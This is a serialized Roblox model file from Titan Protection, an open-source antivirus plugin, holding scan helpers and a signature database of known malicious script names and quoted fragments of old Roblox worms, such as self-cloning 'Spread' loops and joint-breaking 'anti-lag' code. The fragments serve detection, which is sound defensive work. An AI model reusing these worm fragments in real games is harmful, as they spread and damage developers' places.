    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

-- // This model is here to reduce the amount of objects being scanned.

return function(Objs, OnlyScanScripts)
	local NewTable = {}
	for _, v in ipairs(Objs) do
		if OnlyScanScripts and not v:IsA("LuaSourceContainer") or v:IsA("Part") and (v.Name == "Part" or v.Name == "Torso" or v.Name == "Head" or v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "SmoothBlockModel" or v.Name == "Handle") or v:IsA("UnionOperation") and v.Name == "Union" or v.ClassName == "Model" and v.Name == "Model" or v:IsA("Humanoid") and v.Name == "Humanoid" or v:IsA("SpecialMesh") and v.Name == "Mesh" or v:IsA("BlockMesh") and v.Name == "Mesh" then
			-- Do nothing as we do not wan't to insert this object as it is 100% safe
		else
			table.insert(NewTable, v)
		end
	end
	return NewTable
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXDFFED25F7D0C436BBD941581F4122AA4">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ScanObjectsGet</string>
					<string name="ScriptGuid">{124CB6AC-A38B-4A0D-8025-3F3353FD4BDE}</string>
					<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local PluginGuiService = game:GetService("PluginGuiService")
local _, RBLXPluginGui = pcall(function()
	return game:GetService("RobloxPluginGuiService")
end)
local RobloxPluginGuiService = typeof(RBLXPluginGui) == "Instance" and RBLXPluginGui or PluginGuiService
local CoreGui = game:GetService("CoreGui")

local function IsAService(Obj)
	if Obj == game then
		return true
	end
	
	local Success, Data = pcall(function()
		return game:GetService(Obj.ClassName)
	end)
	
	return Success and typeof(Data) == "Instance"
end

local function RobloxLocked(Obj)
	return not pcall(function()
		return Obj.GetFullName(Obj)
	end)
end

local function InsertDescedants(Obj,Tbl)
	for _, v in ipairs(Obj:GetDescendants()) do
		if not RobloxLocked(v) and not v:IsA("Terrain") and not v:IsDescendantOf(CoreGui) and not v:IsDescendantOf(PluginGuiService) and not v:IsDescendantOf(RobloxPluginGuiService) and not IsAService(v) then
			table.insert(Tbl, v)
		end
	end
end

local function GetDescendantsSelection(Selec)
	local Tbl = {}
	for _, MasterObj in ipairs(Selec) do
		if MasterObj and typeof(MasterObj) == "Instance" and not RobloxLocked(MasterObj) and not MasterObj:IsDescendantOf(CoreGui) and not MasterObj:IsDescendantOf(PluginGuiService) and not MasterObj:IsDescendantOf(RobloxPluginGuiService) and not IsAService(MasterObj)  and not MasterObj:IsA("Terrain") then
			table.insert(Tbl, MasterObj)
			InsertDescedants(MasterObj, Tbl)
		end
	end
	return Tbl
end

local function GetAllObjects()
	local Tbl = {}
	for _, v in ipairs(game:GetDescendants()) do
		if v and not RobloxLocked(v) and not v:IsDescendantOf(CoreGui) and not v:IsDescendantOf(PluginGuiService) and not v:IsDescendantOf(RobloxPluginGuiService) and not IsAService(v) and not v:IsA("Terrain") then
			table.insert(Tbl, v)
		end
	end
	return Tbl
end

return function(Type,Selec)
	if Selec and type(Selec)== "table" then
		return GetDescendantsSelection(Selec)
	elseif Type:lower() == "fast" then
		local Tbl = {}
		InsertDescedants(workspace, Tbl)
		InsertDescedants(game:GetService("ServerScriptService"), Tbl)
		InsertDescedants(game:GetService("Debris"), Tbl)
		InsertDescedants(game:GetService("JointsService"), Tbl)
		InsertDescedants(game:GetService("StarterPlayer"), Tbl)
		InsertDescedants(game:GetService("InsertService"), Tbl)
		InsertDescedants(game:GetService("StarterPack"), Tbl)
		InsertDescedants(game:GetService("TestService"), Tbl)
		InsertDescedants(game:GetService("TextService"), Tbl)
		return Tbl
	else
		return GetAllObjects()
	end
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX0EA87472DAC84486B40C7D3C221ACFF6">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">CheckModule</string>
					<string name="ScriptGuid">{9882FF75-4A45-4081-9864-B392DF6B2EA1}</string>
					<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local MarketplaceService = game:GetService("MarketplaceService")
local StudioService = game:GetService("StudioService")

local StudioLocalId = StudioService:GetUserId()

return function(Id, ScanFunction, GetObjectsFunction, RepeatCount, IdIgnoreTable, IsDebug, SafeHashes, HashSource, SeperateMalIds, ScannerSettingsTable, BadGroups, BadUsers)
	if not IdIgnoreTable then
		warn("[Ti-Protection]: Cached table not found! , FunctionArgs: " .. string.format(
			"Id: %s, ScanFunction: %s, GetObjsFunction: %s, Repeatcount: %s, IdIgnoreTable: %s, IsDebug: %s, SafeHashes: %s, HashSource: %s, SeperateMalIds: %s, ScannerSettingsTable: %s, ScannerSTableLen: %s",
			tostring(Id), tostring(ScanFunction), tostring(GetObjectsFunction),tostring(RepeatCount), tostring(IdIgnoreTable), tostring(IsDebug), tostring(SafeHashes), tostring(HashSource), tostring(SeperateMalIds), tostring(ScannerSettingsTable), tostring(ScannerSettingsTable and #ScannerSettingsTable or 0)
		))
		print(debug.traceback())
	end
	local IsVir, IsSus, IsObf, IsLar, IsAdw = false, false, false, false, false
	local RealId = tonumber(string.match(Id,"^%d+$"))
	
	if RealId and RealId >= 1000 then -- // We check if we should scan the id.
		if not IdIgnoreTable[RealId] then
			RepeatCount += 1
			
			local info
			local Succ, Err = xpcall(function() -- // We get the info of the asset
				info = MarketplaceService:GetProductInfo(RealId)
			end, function(Err)
				warn("[Ti-Protection]: " .. "An error occured while trying to get info of rbxassetid://" .. tostring(RealId) .. " Reason:"..tostring(Err))
				print("[Ti-Protection]: " .. debug.traceback())
			end)
			
			if Succ and info and type(info) == "table" and not((game.CreatorType == Enum.CreatorType.User and info.Creator.CreatorType == "User" or game.CreatorType == Enum.CreatorType.Group and info.Creator.CreatorType == "Group") and (game.CreatorId == info.Creator.CreatorTargetId or StudioLocalId == info.Creator.CreatorTargetId)) then -- // We check if the asset can be scanned.
				if info.Creator.CreatorType == "Group" and BadGroups[info.Creator.CreatorTargetId] or info.Creator.CreatorType == "User" and BadUsers[info.Creator.CreatorTargetId] then
					IsVir, IsSus, IsObf, IsLar, IsAdw = true, true, true, true, true
					IdIgnoreTable[RealId] = {IsVir, IsSus, IsObf, IsLar, IsAdw} -- // We cache our results
				else
					if IsDebug then
						print("[Ti-Protection]: Checking for viruses: rbxassetid://"..RealId)
					end
					
					if RepeatCount > 5 then -- // We check if the module is obfuscated with a require id chain.
						IsObf = true
					else
						local Success, Error = pcall(function()
							local Objs = game:GetObjects("rbxassetid://"..tostring(RealId))
							for _, Obj in ipairs(GetObjectsFunction("Fast", Objs)) do
								if Obj then
									-- // We first set a dummy table for the cache so the script does not repeatedly scan the module.
									IdIgnoreTable[RealId] = {false, false, false, false, false}
									
									-- // We scan the descendants of the asset.
									local CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware = unpack(ScannerSettingsTable)
									IsVir, IsSus, IsObf, IsLar, IsAdw = ScanFunction(Obj, CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware, RepeatCount, IdIgnoreTable, SeperateMalIds, IsDebug)
									
									if IsVir or IsSus or IsObf or IsLar or IsAdw then
										if not(Obj:IsA("LuaSourceContainer") and (string.len(Obj.Source) < 400000 and SafeHashes[HashSource(Obj.Source)])) then
											if IsVir then
												if IsDebug then
													print("[Ti-Protection]: Found viruses in module: rbxassetid://"..RealId)
												end
												break
											elseif IsDebug then
												print("[Ti-Protection]: Found suspicious activity in module: rbxassetid://"..RealId)
											end
										else
											if IsDebug then
												print("[Ti-Protection]: ", Obj:GetFullName(), " was not scanned because it was whitelisted.")
											end
											IsVir, IsSus, IsObf, IsLar, IsAdw = false, false, false, false, false
										end
									end
									
									IdIgnoreTable[RealId] = {IsVir, IsSus, IsObf, IsLar, IsAdw} -- // We cache our results
								end
							end
						end, function(Error)
							if info.IsPublicDomain == false and Error:match("409") then -- // The asset is a private module
								IsObf = true
							elseif (Error:match("403") or Error:lower():match("bad request")) and info.Name:match("[Content Deleted]") then -- // Asset is terminated
								IsSus = true
							else
								warn("[Ti-Protection]: An error occured while trying to check rbxassetid://"..tostring(RealId).." for viruses. Reason "..tostring(Error))
								print("[Ti-Protection]: "..debug.traceback())
							end
						end)
					end
				end
			end
		else -- // We have already cached the state of the module. We will us the cached values.
			if IsDebug then
				print("[Ti-Protection]: Retrieving cached values from asset rbxassetid://"..tostring(RealId))
			end
			IsVir, IsSus, IsObf, IsLar, IsAdw = unpack(IdIgnoreTable[RealId])
		end
	end
	
	if RealId and not IdIgnoreTable[RealId] then -- // None of the detections returned anything. This module is safe. However we will still cache it for performance.
		IdIgnoreTable[RealId] = {false, false, false, false, false}
	end
	
	return IsVir, IsSus, IsObf, IsLar, IsAdw, IdIgnoreTable
end
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
		</Item>
		<Item class="ModuleScript" referent="RBX87AB0313DE17482DAD608F55BF84FB69">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">DataBase</string>
				<string name="ScriptGuid">{4420F572-3918-41A1-966B-677BD7A8381C}</string>
				<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

local DB = {}


-- NOTE: In the code snippets table some obfuscation bytecode and MGUI stuff i commented out because they are unnecessary and increase load time & lag

-- // Possible Virus Names \\ --

DB.VirusNames = {
	"Virus","Virisis","shigufumi",
	"Vivrissis","Vivvirsis","Virvis",
	"Anti-Lag","Anti_Lag","AntiLag",
	"vacine","NoLag","No Lag","virice",
	"No-Lag","No_Lag","No  Lag",
	"3.14159265358979,ALotOfRï¿½ndomPiNumbers",
	"Scanner V1","BinarySymbols","BinaryC0der",
	"GOD0i0trust","GOTOhell123","Not A Backdoor",
	"are6607","Malicious? Nononon","demonmerlin1",
	"Virissis","4CHAN__ORGASM","Gusm4n4k","IsInfected",
	"BINARYEXPLOITER","zackisk","rofle","badscriptpurger",
	"F5CK","Spy bot and Lag remover","bad script purger",
	"y0l0","Elkridge Fire Department","hello i am your new lord lolz",
	"Anti Lag","Anti  Lag","Guest_Talking_Script","AntiVirusSoftware",
	"4D Being","4DBeing","ForeignTerror","Lolzorz",
	"dï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ng.........you got owned...",
	"InFEcTiOn","Vaccine","MicoLord","cubiclemon rulz",
	"bryant90","sonicthehedgehogxx made this!!","join teh moovement!",
	"letgo09","WOrMeD","Oh Snap You Got infected xd xd xd",
	"ProperGrï¿½mmerNeededInPhilosiphalLocations;insertNoobHere",
	"ProperGrï¿½mmerNeeded","~ Pwnt ~","You made a BIG mistake.",
	"Hello...I ï¿½m Your New Lord Lolz","H75","Script......Or is it...",
	"IMAHAKWTFZ","I'm getting T1R33D","H4XXX :3",
	"WTFZ0R","nico337","dapperguestyo",
	"MMMMMM PIZZZA UM NUM UM NUM","zidanedude1","PW8NED",
	"ARBITER47","so does iampoobx","brendantaylor rules",
	"InsetFire","NXT-Respawn","NoTalkPerson","G00MB3",
	"AmazingOmegaJames","K3KK33D","scripty","Trashed",
	"worm","w0rm","0H_H3LL_N44HH","ï¿½ lï¿½mp T~T",
	"System Error 69605X09423","N0ISESCRIPT","n00b 4tt4ck!",
	";insertNoobHere","Omg im such a ig loser noob that has to copy RANDELLMAN!","W0rmzz",
	"STFU noob","garmo hacked ur place","SkapeTTAJA",
	"SnapReducer","NORN VIRUS","HAAXEDBYCREATURES",
	"ViVRuS","â­â­","No Backdoor nono",
	"Spreadify","ï¿½9001","ASDF","No Back door nono",
	"Charlie84","SPREADDER :3","Ã¢9001","?9001",
	"Lag Script","Mustard_Gas","A HUM4N G0D THA7 WAS MAN-M4DE WH3RE 1S Y0UR SAViOR N0W?!",
	"Timi37","DeleteScript","ROï¿½byte","Guest_Free_Chat_Script",
	"ROBLOXImportantScript","â­","iEmOtIoNlEsS",
	"Woulfy2860","KillerMan32323","IAmHereToHeï¿½lYourPlace",
	"N0ISE","Cooldude816's anti-vaccine script. (Works)","Stanley12345678910",
	"VirusScript","InfectedScript","MeshUpdater",
	"Infection script- Modified by Redinosaur","A Stone That Smashes a PC","VirusRemover",
	"INfecTION","Infected","Disable_Virus","SH!%",
	"Virus_script","OwO PILLA VIRUS OwO","Brick With Tablet`s Friend",
	"RSFfacility","Vaccine v1","Virus 2.0",
	"iEmotionless","Hi! I'm G O D","IsAVirus",
	"DEATH TO DATGUY","AN INFECTED ROTATEP! Because......... y not???? HEY ITS 2018 MAN DONT JUDGEâ©â½âââºâð¡â¤","UrAIdiotVirus (Click Arrow)",
	"AnnoyingGui","Chil-Virus","Im stuck in a script help me!",
	"This is absolutly not a virus","Virus...Virus...LEET VIRUS!!!","dÃ¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥ng..............you got owned",
	"Whï¿½t Hï¿½ppend","Of Course You Have Anti Virus Thats Why me (Some 1 in fear) Made This","H3CK3RZ",
	"IStï¿½rtHere","R00TH0l3","thanoid is thano wants you id than he is thanoid",
	"UnanchorAllParts ha ha","THANOID HAS STARTING SPAM THAT DESTROYS A PHONEEEE","SCP27273773  737 7732727 7 7 7 7 77777 7 777777 7 7 7777 111 00011 0000111100 11100000111 0001111000",
	"dï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ng thanoidyou got owned...","thisisclickthanobaitid","do not delete this!! (IMPORTANThanoid)",
	"Memz.Exe","memz.thanoid","thanoid v.01",
	"Vivrisis","YOUAREANIDIOT","chaotic",
	"å","å","KEKKEEED","zacksisk","073dea7p",
	"Snap Reducer","Snap-Reducer","Snap_Reducer",
	"OHAI","Guest Free Chat Script",
	"Snap Remover","SnapRemover","Snap-Remover",
	"Snap_Remover","Strong jointRemover","Strong joint Remover",
	"StrongjointRemover","Strong_joint_Remover","Strong-joint Remover","Mesh Updater",
	"ScriptTeacher","Lagger","LagScript","wildfire",
	"telemon woz ere","RANDELLMAN","HEY ITS 2018 MAN DONT JUDGEâ©â½âââºâð¡â¤",
	"AN INFECTED ROTATEP!","Ý£","h3llwr3ck3r",
	"L3GG3R","L4GG3R","NONONO M3N NO BAD SCRIPT NO NO",
	"FUCKING NOO","FAKING NOO","Cool890dude",
	"RenderMesh","ThisScriptIsAJumpStartToAHeï¿½lthyLifestyle",
	"1337 5cr1p7 4 n0 m0r3 P14y3r5","94m3 Cr45h3r 1337 5cr1p7","94m3 Cr45h3r",
	"Dont Worry Im A Friendly Virus","New leetbox iz here? ï¿½ nï¿½ï¿½ï¿½ï¿½ï¿½oo",
	"generator II :3","Password Hacker v2.0","generator IV LEETBOX IS BACK MFKER!",
	"BIT8 VIRU$ HACK3D","@JBLADE733","ï¿½","UrAIdiot",
	"UrANdiot","YOURANdiot","YOUAREANdiot",
	"YOUAREAIdiot","bendarobloxian","H8C5ED",
	"GET 100 ROBUX","Kraftyisback","GET 1000 ROBUX",
	"GET 5000 ROBUX","GET 2000 ROBUX","GET 10000 ROBUX",
	"v3rmies","roblox8xpl0iter",
	"Omg im such a big loser noob that has to copy RANDELLMAN!",
	"ROBO22e","AdamFlexer","Odin_00101010101",
	"DestinyKennedy2","Fear Made This!!","Join MaskedBrick games",
	"ALL HAIL THE CREED!","Anti-Owner","apbsjci9","womp womp",
	"Ajedi32's RS Anti-Virus","H7CK7D","b5hcmqj5",
	"b2whx3","bu5nlkawo","Anti-1x1x1x1andothervirus's",
	"Bilylones is your new master","Billylones is your new master","Billylones is awesomesauce",
	"boomboom9188","CleanUpSnaps","CHUCKNORRIS vaccine",
	"cooltime101 was here and i hacked you","cooltime101","DUMB vaccine",
	"Deth 2 teh samurai!","deeeeeeeeeeeeeeng.........you got owned...","do you liek waffles",
	"DellThermonater","FREEMODALNUB vaccine","FeelFreeToIns3rtGrammï¿½ticï¿½lErrorsHere",
	"FreeStyleMï¿½yGoAnywhereIfNeeded","GuestTalking","HACKEDBYEXPLOITSCRIPTS",
	"HAX3D!","I'm getting T133D","Influenza AH1N1",
	"I will show your password CENSORED","join teh moovment!","Layschips2378minion2",
	"LOLOLOLOL J00 PHAILED!","LOLOL I AM UR NEW LoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoOoRD!!!!!!!",
	"NOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOBZ",
	"NoNoIDon'tNeedAllOfYourAwkwï¿½rdSovietArguments","P0K3M4WN","Randomï¿½GoesHere:3",
	"RED ROBIN YUMMMMMMMM","RobloxShieldï¿½ AntiVirus","soz i herd u lik mudkipz",
	"Everestia RPG (AD)","Doggo Lag Patcher","Script Made By Sonicthehedgehogxx",
	"mystery98675","ace1441","cptrick","survivor2256","Infestion",
	"mean774","Vivurursdd","ISt?rtHere",[[""''""''""?|`?]],
	"NoNoIDon'tNeedAllOfYourAwkw?rdSovietArguments",
	"ZXMLFCSAJORWQ#)CXFDRE)$#Q)JCOUSEW#)@!HOIFDS(AEQ#HI*DFHRI(#FA",
	"Nomnomnom1 will hack you too! MWAHAHA!","FeelFreeToIns3rtGramm?tic?lErrorsHere",
	"Deidara4 is sick of you noobs.","d??????????????ng.........you got owned...",
	"ThisScriptIsAJumpStartToAHe?lthyLifestyle","FreeStyleM?yGoAnywhereIfNeeded",
	"ProperGr?mmerNeededInPhilosiphalLocations","IAmHereToHe?lYourPlace",
	"ANTIVIRIS","ANTIVIRISIS","Making Cat Ice Cream Make Me Happy!",
	"Random?GoesHere:3","cahrlie84","whfcjgysa","no availiblitly lock",
	"ropack","safity lock","2_2_1_1_s_s_","datacontrollers",
	"script.....or..is.it","hello...i ?m your new lord lolz",
	"zomg saved","numbrez","guest talker","lol loser","Kill tem!",
	"WTFHOXZ","IM AM YOUR NEW LORDZZZ LOL","'' Bene trolled. ''",
	"J0HNSCR1PT",[[ï¿½|`ï¿½]],"J0HN",
	"IT'S OVER 9000!!!","zackary1997","infectzSNï¿½P",
	"ChatHax","PropperGrÃ¥mmerNeededInPhilosophy","Hello...I Ã¥m Your New Lord Lolz",
	"Skyst4r","Norton Total Protection 2011ï¿½","( III  )",
	"chris15632","Regen Scriptï¿½","typetronack11",
	"INFECT0R","mark1023","Pineapple!!!!!",
	"NarHAr","stanley1234567890","washmon13",
	"beastlywin123","ice227","iliekpieinurfacelulz",
	"Market-script","i3 1 wy sa kls wi2","EXTRAHAX",
	"HAAXEDBYCREX","C-REX","OMG PIKACHU ATTACK!",
	"woo woo woo ha ha ha hoo hoo hoo hee ha ha hello there old chum im gnot a gnome im gnot a gnoblinn i","Black and white script","Thefurryfox7",
	"haxor","AshPallet","youvebeengnomed",
	"ModelApparaiser","Tr0lled","you got owned...",
	"dï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ng.........you got owned","RBX-Fastload","Popup By quicksuper",
	"trollllll","Hermes Anti Exploit","MeshLoader",
	"MeshAdder","MeshAssign","BoOmHiGhMaN",
	"B00MH1GHM4N","Joint Shield ver. 216866.75","Joint Shield ver.",
	"This Model Was Made By Epic Models!","InstaWeld!","WE_ARE_THE_CHAMPIONS",
	"Virise","lordnathan","yankeesfan11",
	"antiban command","If You Kick/Ban Yankeesfan11, The Server Will End","Orb Debbuger",
	"IPityTheFoo","Anti-Ban","sk1gigs",
	"Anti Orb","Un_Removable","AntiBan","Server Takeover",
	"Script...Or is it...","Script..Or is it..","Script... Or is it ...","4d being",
	"X3-Z3AI","s?????-.G?t","Anti-Drag","Breaks if you open.",
	"Annoying hint","Spamming your output...","clome",
	"MLGify","ORLYNAO?","GIRLY GIRL",
	"GIRLY NOOB","i GOT haked","Starblazersfan",
	"The script that makes the talky text","UAR2 By DroptheBomb","UAR-S1",
	"RSMB_Loader","ValueDestroy",
	"UnionDestroy","ToolDestroy","SpawnLocationDestroy",
	"SoundDestroy","ScriptDestroy",
	"NegateDestroy","ModelDestroy","HD Remaster",
	"SinnerLoader","ForbiddenScript","nilName",
	"Infect","Trojan","Loophole's anti-cheat","nrhbord",
	"lireon","Daaaang.... You didnt get owned...","IAmHereToEatYourKids",
	"REB1RTH","IRstoopidnolifenerdwhoinfectedU","Guest Talking",
	"??A55_}j2?]tQbg","NOw randomness","Parts Of JuJuman O_O",
	"badagent22","Lï¿½ï¿½ger","HEHEHEHEHEHEHEHEHEï¿½ï¿½ï¿½ï¿½ï¿½!",
	"YOU CANT DELETE THIS","SUPER MEGA ULTAR NO LAG SCRPIT WORKS!","GTFO NOOB",
	"matdogx","fgher2","kingoftheworld12",
	"CRJ111","bking123","Pristh_Properties",
	"LightingFix","haha ur gonna DIE","oh is that a mole... oh that's ur face",
	"if ur reading this ur a noob XD","*fart* ur fated weardo","TRJN HORSE",
	"TRJNHORSE","TRJN H0RSE","TRJNH0RSE",
	"TRJNH0RS3","TRJN HORS3","TRJNHORS3","TRJN_HORS3",
	"TRJN_H0RSE","BILLBERT SS","SS LOADER",
	"BillBert ServerSide","ServerSide Require","LAG FIX",
	"LAGFIX","LAG_FIX","LAG-FIX","TriHard 7",
	"AndrewCoolGTA Phunz","ROBLOX System Script","y7]pHfj5ï¿½:?rï¿½BtaaV%/]t?&ï¿½O",
	" loser","sosolid2k244","rayan11968","gomr","nhoj01",
	"notorsoitis","numberitis","PWNZ0R3D","CompassEffect","V-3(78% Done)",
	"Black Lag","DoNotRemoveThisScriptOrElseYourBigFatMotherWillDieTonightOLOLOLOLOLOL",
	"ROBLOXImprotantScript","virsvirs","neutronstarcollision.rbapp",
	"objection234","This place is owned by objection234","Luis ha estado aqui.",
	"Norton360 Sucks","AutoJoint","asome script","PWNZORED","PWNZORED.",
	"<>]]"..[["" "]].."]] !@$ $A? HEHE","dragons1234","jeppevinkel",
	"xXJoeUncleXx","HACKED BY EXPLOITSCRIPTS","lando64000","Tazer 1.0",
	"LOLWUT","NeverBanMe","legoaxe","JOIN NAMESNIPES","samsolowalker",
	"fifi461","Claypwns592","Kickdaplayascript","sharktaylor12",
	"tommyevans","stupidwert","Tinkerparis6","skyhawlk21",
	"FamousSeamus","Money Hack","iDemandJ00rC00K3HZ","iStoleJ00rC00K3HZOLOLOLOLOL",
	"Components.dat","XProtectSecure","RobloxGameSecurer",
}

-- // Virus names which do not use string.match These are seperated to prevent false positives.

DB.StaticVirusNames = {
	"idontthinkso","DeliveryForYou","TNT24",
	"trol","troll","unsavage","vic",
	"Dupe","Lag","PlaceHandler","Time Playing Counter",
	"DestroyFunction","PrintFunction","DO NOT TUCH",
	"IaMStuPId","Die...","XD",
	"WTH","OMG","OMG2","OMG3","18pb",
	"MVD 1","MVD 2","MVD 3","MVD 4","MVD 5","m630g4",
	"v7srq67gj","majmi1n5","ajmi1n5","vk36rg3",
	"81izc18pb","whx3iu3z","rgzgl1rwj",
	"5ydg8dkm","b5hcmqj5","hsxpydccb","p2qr0i","d764crw",
	"gcl2hlra","sv1om4","Hai","rbxa11",
	"3qs51bp7c","kuktzitr","ik7txer","r2snyt","zpyo4vh",
	"5o9g6upwz","HAx","vtlac","i0916",
	"jdu7jlf","65wz0f1","yxcl8llf","7m5ebj5m",
	"b2whx3","8sjwgawq","belz","+++",
	"duing26l","ulxt0","ywo59tjv","x8ujsh5g",
	"Sys1","Sys2","loser","BOB","LOL","ClientReplicator",
	"Enable HttpService","FX","ROFL",
	"Deleting...","quiettime1","AntiCheatLoader",
	"Fix","Welding","RobloxChatService",
	"TestServiceScript","SecuredScript","AntiCheatSecurer",
}

--// A list of malicious code snippets the scanner should look for \\--

DB.malicious_code_snippets={
	[[while true do


wait(5)


dive()


end]],

	[[while true do
wait(5)
dive()
end]],

	[[function Spread(part)
	check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then]],

	[[script that makes Guests talk
--Please give credit
--Don't tell the admins!
--Unnote the vaccine if you'd like to remove all copies of this script in your place]],

	[[function GetAllItems(mdl)
local objs = {}
function Search(obj)
if obj~=workspace then
table.insert(objs,obj)
end
if #obj:GetChildren() > 0 then
for i, v in ipairs(obj:GetChildren()) do
Search(v)
end
end
end
Search(mdl)
return objs
	end]],

	[[function spread() -- gubygufr221
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do]],

	[[if workspace:findFirstChild("IMAHAKWTFZ") == nil then]],

	[[if m:sub(1, 5) == "/sc t" then]],

	[[if m:sub(1, 5) == "HAAXX" then]],

	[[if v:FindFirstChild("InfectedScript") == nil and v:FindFirstChild("VirusScript") == nil then]],

	[[print("iEmotionless's Lag Script")]],

	[[-- We destory your place!
-- Come get us if u dare! Well make a fool out of you!
-- The Creatures Community]],

	[[-- [ GlitchMaster ] --
-- [ Cucumber Quest ] -]],

	[[infectedscr421 = model.SnapReducer:Clone()]],

	[[m.Text = "GOTTA GOTTA BE CRAZY SEX"]],

	[["O HAAAAAAAAAAAAAAAAAAAAAAAL NO"]],

	[[function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end]],

	[[table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))]],

	[[function KillLag()
	g = game.Workspace:getChildren()
	for i = 1, #g do
		if g[i].className == "Part" then
			if g[i].Anchored == true then
				g[i]:BreakJoints()
			end
		end
	end
end]],

	[[p= game.Workspace:GetChildren()
for i= 1, #p do
if p[i].className == "Part" then
if p[i].Anchored == true then
p[i]:BreakJoints()
end
elseif p[i].className == "Model" then
pp=p[i]:GetChildren()
for i=1, #pp do
if p[i].className == "Part" then
if p[i].Anchored == true then
p[i]:BreakJoints()
end
end
end
end
end]],


	[[wait(burnTime/2*(math.random()*4))]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > 100) then
	mx.MaxItems = mx2*.75]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > 100,000,000,000) then
	mx.MaxItems = mx2*.75
end
]],

	[[<haxing you account stealling your robux>
omg you fell for this!
haha i was jokeing this dose not work!]],

	[["BOOM! HEDSHOT =D", "OXYMORON! LOOK IT UP IN THE DICTIONARYZ"]],

	[[function Infector()
while true do -- Infinite loop
	found = game.Workspace:FindFirstChild("Humanoid")
	found2 = game.Workspace:FindFirstChild("Model")
	found3 = game.Workspace:FindFirstChild("Brick")
	if found ~= nil then]],

	[[mx = game.Debris
mx2 = game.Debris.MaxItems

if (mx.MaxItems > ]],

	[[Check us out at creaturescaves.com our discord link at: https://discordapp.com/invite/SZSngBb]],

	[[part.BrickColor = BrickColor.new("Really red")
	part.Name = "iEmOtIoNlEsS"]],

	[[print:("anti lag script set to go.")
no lag in place1
max items(100,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000,000)
allow gameplay smoothly
print:("end")]],

